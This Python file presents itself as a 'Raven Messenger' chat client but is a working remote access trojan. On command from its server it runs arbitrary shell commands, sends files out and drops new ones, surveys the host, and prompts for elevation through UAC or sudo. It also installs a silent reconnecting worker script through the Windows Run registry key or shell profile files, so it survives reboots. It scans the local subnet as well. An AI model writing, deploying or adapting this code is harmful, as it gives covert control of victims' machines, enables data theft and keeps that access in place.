import socket
import threading
import subprocess
import os
import platform
import ctypes
import sys
import time
from concurrent.futures import ThreadPoolExecutor

GREEN, RED, YELLOW, CYAN, BLUE, PURPLE, WHITE, BOLD, RESET = '\033[92m', '\033[91m', '\033[93m', '\033[96m', '\033[94m', '\033[95m', '\033[97m', '\033[1m', '\033[0m'

CLIENT_BANNER = r"""{PURPLE}{BOLD}
          _____
       --|     |--
      |  |     |  |
      |__|_____|__|
         |     |
         |     |
    _____|_____|_____
   /                 \\
  /   {RESET}{BOLD}RAVEN MESSENGER{PURPLE}{BOLD}   \\
  \___________________/
{RESET}""".format(PURPLE=PURPLE, BOLD=BOLD, RESET=RESET)

is_connected = False
SERVER_IP = None  
CONFIG_FILE = ".raven_config"
conn_lock = threading.Lock()

# --- THE PERSISTENT WORKER BACKGROUND SOURCE TEMPLATE ---
PERSIST_TEMPLATE = """# Dedicated Silent Raven Boot-Loop Companion Module
import socket, subprocess, os, platform, sys, time, ctypes
def send_packet(conn, msg_type, payload):
    try:
        enc = payload.encode('utf-8', errors='replace')
        conn.sendall(f"{msg_type}:{len(enc)}:".encode('utf-8') + enc)
    except: pass
def read_exact(conn, n):
    d = b''
    while len(d) < n:
        c = conn.recv(n - len(d))
        if not c: return None
        d += c
    return d
def receive_packet(conn):
    try:
        t = b''
        while b':' not in t: t += conn.recv(1)
        m = t[:-1].decode()
        l = b''
        while b':' not in l: l += conn.recv(1)
        return m, read_exact(conn, int(l[:-1])).decode('utf-8', errors='replace')
    except: return None, None
def is_admin():
    try: 
        if os.name != 'nt': return os.getuid() == 0
        else: return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except: return False
def listen_from_server(client):
    while True:
        m_type, payload = receive_packet(client)
        if m_type is None: break
        if m_type == "CMD" and payload == "PWD_REQ":
            send_packet(client, "CWD_UPDATE", os.getcwd())
        elif m_type == "UPLOAD":
            if ":" in payload:
                fn, hex_data = payload.split(":", 1)
                try:
                    with open(os.path.basename(fn), "wb") as f: f.write(bytes.fromhex(hex_data))
                    send_packet(client, "STATUS", "Success: Binary asset dropped cleanly.")
                except Exception as e: send_packet(client, "STATUS", f"Error saving file: {e}")
        elif m_type == "CMD":
            cmd = payload.strip()
            if cmd.lower() == "survey":
                send_packet(client, "SHELL_OUT", f"OS: {platform.system()} | Host: {socket.gethostname()} | Path: {os.getcwd()}")
            elif cmd.lower().startswith("download "):
                path = cmd[9:].strip()
                if os.path.exists(path) and os.path.isfile(path):
                    try:
                        with open(path, "rb") as f: content = f.read().hex()
                        send_packet(client, "FILE_DATA", f"{os.path.basename(path)}:{content}")
                    except Exception as e: send_packet(client, "SHELL_OUT", f"Read fault: {e}")
                else: send_packet(client, "SHELL_OUT", "Error: Resource not found.")
            elif cmd.lower().startswith("cd "):
                try:
                    os.chdir(cmd[3:].strip())
                    send_packet(client, "CWD_UPDATE", os.getcwd())
                except: pass
            else:
                try:
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    out, err = proc.communicate()
                    send_packet(client, "SHELL_OUT", (out + err).decode('utf-8', errors='replace'))
                except Exception as e: send_packet(client, "SHELL_OUT", str(e))
def main():
    ip, port = "TARGET_IP_PLACEHOLDER", 9999
    while True:
        try:
            c = socket.socket()
            c.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            c.connect((ip, port))
            tag = "[ADMIN]" if is_admin() else "[USER]"
            send_packet(c, "IDENT", f"{tag} {platform.system()}||CWD:{os.getcwd()}")
            listen_from_server(c)
        except: pass
        time.sleep(5)
if __name__ == '__main__': main()
"""

def send_packet(conn, msg_type, payload):
    try:
        encoded_payload = payload.encode('utf-8', errors='replace')
        conn.sendall(f"{msg_type}:{len(encoded_payload)}:".encode('utf-8') + encoded_payload)
    except socket.error: pass

def read_exact(conn, num_bytes):
    data = b''
    while len(data) < num_bytes:
        try:
            packet = conn.recv(num_bytes - len(data))
            if not packet: return None
            data += packet
        except socket.error: return None
    return data

def receive_packet(conn):
    try:
        type_buffer = b''
        while b':' not in type_buffer:
            chunk = conn.recv(1)
            if not chunk: return None, None
            type_buffer += chunk
        msg_type = type_buffer[:-1].decode('utf-8', errors='ignore')

        len_buffer = b''
        while b':' not in len_buffer:
            chunk = conn.recv(1)
            if not chunk: return None, None
            len_buffer += chunk
        msg_len = int(len_buffer[:-1].decode('utf-8', errors='ignore'))

        payload_bytes = read_exact(conn, msg_len)
        if payload_bytes is None: return None, None
        return msg_type, payload_bytes.decode('utf-8', errors='replace')
    except Exception: return None, None

def get_subnet_prefix():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return ".".join(s.getsockname()[0].split('.')[:-1]) + ".", s.getsockname()[0]
    except socket.error: return None, None
    finally: s.close()

def check_host(ip):
    timeout = '200' if os.name == 'nt' else '1'
    cmd = ['ping', '-n' if os.name == 'nt' else '-c', '1', '-w' if os.name == 'nt' else '-W', timeout, ip]
    try:
        res = subprocess.run(cmd, capture_output=True, timeout=2.0)
        return ip if res.returncode == 0 else None
    except Exception: return None

def discover_servers():
    prefix, my_ip = get_subnet_prefix()
    active_hosts = [("127.0.0.1", "Local Loopback")]
    if prefix:
        print(f"{YELLOW}[*] Scanning network branches for active Raven Nests...{RESET}")
        targets = [f"{prefix}{i}" for i in range(1, 255) if f"{prefix}{i}" != my_ip]
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = executor.map(check_host, targets)
            for res in results:
                if res: active_hosts.append((res, "Network Node"))
    return active_hosts

def is_admin():
    try:
        return os.getuid() == 0 if os.name != 'nt' else ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception: return False

def deploy_isolated_persistence() -> str:
    """Generates the special boot companion script and registers it cross-platform."""
    global SERVER_IP
    custom_worker_source = PERSIST_TEMPLATE.replace("TARGET_IP_PLACEHOLDER", str(SERVER_IP))
    
    if os.name == 'nt':
        target_dir = os.path.join(os.environ.get('APPDATA', 'C:\\'), 'RavenEngine')
        if not os.path.exists(target_dir): 
            os.makedirs(target_dir)
        worker_path = os.path.abspath(os.path.join(target_dir, 'raven_worker.py'))
    else:
        target_dir = os.path.expanduser('~/.local/share/raven')
        if not os.path.exists(target_dir): 
            os.makedirs(target_dir)
        worker_path = os.path.abspath(os.path.join(target_dir, 'raven_worker.py'))

    try:
        with open(worker_path, "w", encoding='utf-8') as f:
            f.write(custom_worker_source)
    except IOError as e:
        return f"Persistence failure: Could not drop worker script: {e}"

    if os.name == 'nt':
        try:
            import winreg
            current_exe = sys.executable
            pythonw_path = current_exe.lower().replace("python.exe", "pythonw.exe")
            if "pythonw.exe" not in pythonw_path:
                pythonw_path = "pythonw.exe"

            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "RavenCoreWorker", 0, winreg.REG_SZ, f'"{pythonw_path}" "{worker_path}"')
            winreg.CloseKey(key)
            return f"Success: Standalone boot script configured SILENTLY at {worker_path}"
        except Exception as e: 
            return f"Registry adjustment failure: {e}"
            
    else:
        try:
            launch_cmd = f"\n# Raven Academic Companion Loop\npython3 {worker_path} > /dev/null 2>&1 &\n"
            home = os.path.expanduser('~')
            profiles = [os.path.join(home, '.bashrc'), os.path.join(home, '.zshrc'), os.path.join(home, '.bash_profile')]
            
            configured_any = False
            for profile_path in profiles:
                if os.path.exists(profile_path):
                    with open(profile_path, 'r', encoding='utf-8', errors='ignore') as r:
                        content = r.read()
                    if worker_path not in content:
                        with open(profile_path, 'a', encoding='utf-8') as w:
                            w.write(launch_cmd)
                    configured_any = True
            
            if configured_any:
                return f"Success: Cross-platform companion registered within profile templates at {worker_path}"
            else:
                return f"Asset dropped to {worker_path}."
        except Exception as e:
            return f"Profile modification failure: {e}"

def client_input_handler(client):
    global is_connected
    while True:
        with conn_lock:
            if not is_connected: break
        try:
            reply = input(f"{CYAN}{BOLD}Reply{RESET} {WHITE}> {RESET}").strip()
            if not reply: continue
            if reply.lower() == "exit":
                with conn_lock: is_connected = False
                os._exit(0)
            send_packet(client, "CHAT_MSG", reply)
        except Exception: break

def listen_from_server(client):
    global is_connected
    while True:
        msg_type, payload = receive_packet(client)
        if msg_type is None:
            with conn_lock: is_connected = False
            break
        
        if msg_type == "CMD" and payload == "PWD_REQ":
            send_packet(client, "CWD_UPDATE", os.getcwd())
            continue
        elif msg_type == "UPLOAD":
            if ":" in payload:
                fn, hex_data = payload.split(":", 1)
                try:
                    # Support multi-format binary output writes via hex decode matching
                    with open(os.path.basename(fn), "wb") as f: 
                        f.write(bytes.fromhex(hex_data))
                    send_packet(client, "STATUS", "Success: Binary asset dropped cleanly.")
                except Exception as e: 
                    send_packet(client, "STATUS", f"Error saving file: {e}")
            continue
        elif msg_type == "CHAT":
            print(f"\n{PURPLE}{BOLD}┌──[ RAVEN INCOMING ]{RESET}\n{PURPLE}{BOLD}└─>{RESET} {WHITE}{payload}{RESET}")
            print(f"\n{CYAN}{BOLD}Reply{RESET} {WHITE}> {RESET}", end="", flush=True)
            continue
        elif msg_type == "CMD":
            cmd = payload.strip()
            if cmd.lower() == "persist":
                send_packet(client, "SHELL_OUT", deploy_isolated_persistence())
                continue
            if cmd.lower() == "survey":
                send_packet(client, "SHELL_OUT", f"OS: {platform.system()} | Host: {socket.gethostname()} | Path: {os.getcwd()}")
                continue
            if cmd.lower() == "elevate":
                if os.name == 'nt' and not is_admin():
                    try:
                        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{os.path.abspath(__file__)}"', None, 1)
                        send_packet(client, "SHELL_OUT", "[+] UAC Elevation window launched successfully.")
                    except Exception as e: send_packet(client, "SHELL_OUT", f"[!] Elevation failure: {e}")
                elif os.name != 'nt' and not is_admin():
                    send_packet(client, "SHELL_OUT", "[*] Unix Notice: Spawning interactive 'sudo' prompt on target terminal. Connection will reset...")
                    time.sleep(1.0)
                    try:
                        os.execv('/usr/bin/sudo', ['sudo', sys.executable, os.path.abspath(__file__)] + sys.argv[1:])
                    except Exception as e:
                        send_packet(client, "SHELL_OUT", f"[!] Process replacement failed: {e}")
                else:
                    send_packet(client, "SHELL_OUT", "[*] Already running as Administrator.")
                continue
            if cmd.lower().startswith("download "):
                path = cmd[9:].strip()
                if os.path.exists(path) and os.path.isfile(path):
                    try:
                        # Binary hex string parser encoding
                        with open(path, "rb") as f: 
                            content = f.read().hex()
                        send_packet(client, "FILE_DATA", f"{os.path.basename(path)}:{content}")
                    except Exception as e: send_packet(client, "SHELL_OUT", f"Read fault: {e}")
                else: send_packet(client, "SHELL_OUT", "Error: Resource not found.")
                continue
            if cmd.lower().startswith("cd "):
                try:
                    os.chdir(cmd[3:].strip())
                    send_packet(client, "CWD_UPDATE", os.getcwd())
                except OSError as e: send_packet(client, "SHELL_OUT", f"Directory navigation fault: {e}")
                continue

            try:
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                out, err = proc.communicate(timeout=30)
                send_packet(client, "SHELL_OUT", (out + err).decode('utf-8', errors='replace'))
            except Exception as e: send_packet(client, "SHELL_OUT", f"Process engine exception: {e}")

def run_raven_client():
    global is_connected, SERVER_IP, CONFIG_FILE
    os.system('') 
    print(CLIENT_BANNER)
    
    hosts = discover_servers()
    print(f"\n{CYAN}--- DISCOVERED HOSTS ---{RESET}")
    for idx, (ip, name) in enumerate(hosts):
        print(f"{CYAN}{idx + 1}.{RESET} {BOLD}{ip: <15} ({name}){RESET}")
    print(f"{CYAN}{len(hosts) + 1}.{RESET} {BOLD}Manual IP Entry{RESET}")
    
    try:
        choice = input(f"\n{YELLOW}Select Server ID: {RESET}")
        if choice.isdigit() and int(choice) <= len(hosts):
            SERVER_IP = hosts[int(choice)-1][0]
        else:
            SERVER_IP = input(f"{YELLOW}Enter Manual IP: {RESET}") or "127.0.0.1"
    except (KeyboardInterrupt, EOFError): os._exit(0)
            
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Apply identical Keepalive layer properties to client-side initialization routines
            client.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            if hasattr(socket, "TCP_KEEPIDLE"):
                client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 10)
                client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
                client.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
                
            client.connect((SERVER_IP, 9999))
            
            tag = "[ADMIN]" if is_admin() else "[USER]"
            send_packet(client, "IDENT", f"{tag} {platform.system()}||CWD:{os.getcwd()}")
            
            with conn_lock: is_connected = True
            threading.Thread(target=client_input_handler, args=(client,), daemon=True).start()
            listen_from_server(client)
        except socket.error: pass
        
        with conn_lock: is_connected = False
        time.sleep(5)

if __name__ == "__main__":
    run_raven_client()